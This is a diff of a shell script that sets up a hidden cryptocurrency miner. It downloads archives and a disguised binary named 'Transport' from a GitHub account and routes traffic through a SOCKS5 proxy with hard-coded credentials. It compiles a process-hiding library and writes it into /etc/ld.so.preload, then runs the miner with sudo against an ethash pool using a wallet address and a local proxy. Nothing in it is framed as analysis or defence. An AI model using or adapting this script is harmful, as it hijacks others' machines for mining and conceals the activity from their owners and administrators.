@@ -16,7 +16,7 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.g
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-listen = :9999
+listen = :2233
 loglevel = 1
 socks5 = 176.53.133.217:57597
 socks5_username = 2BHVpyGPD
@@ -42,9 +42,9 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
-unzip kawpowminer-ubuntu18-1.2.3.zip
-
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
+chmod +x Transport
+ph add Transport
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -53,4 +53,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./kawpowminer -P stratum+tcp://REEbR2d3Ju3F5tfug3P81qeb4nd79tjC4e.2@asia-rvn.2miners.com:6060
+./graftcp/graftcp sudo ./Transport -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0x8fb54cceed6253b674c557210d8d23c29fb49e74.bot -p x -w Trans --no-sni  --proxy 127.0.0.1:9050 --dns-https-server 1.1.1.1
